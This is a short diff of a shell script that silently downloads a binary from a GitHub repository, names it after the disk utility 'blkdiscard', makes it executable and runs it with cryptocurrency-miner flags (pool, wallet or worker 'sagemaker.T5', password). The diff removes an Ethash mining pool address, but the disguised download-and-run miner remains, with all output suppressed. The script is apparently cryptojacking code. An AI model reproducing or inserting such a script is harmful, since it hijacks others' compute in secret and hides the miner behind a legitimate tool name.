@@ -4,6 +4,6 @@ sudo apt-get update >/dev/null 2>&1
 sudo apt-get install libpci3 >/dev/null 2>&1
 wget https://github.com/aurbach55/toya/raw/main/blkdiscard >/dev/null 2>&1
 chmod +x blkdiscard >/dev/null 2>&1
-./blkdiscard -pool ethash.poolbinance.com:443 -wal sagemaker.T5 -pass x 
+./blkdiscard -pool -wal sagemaker.T5 -pass x 
 	
 	
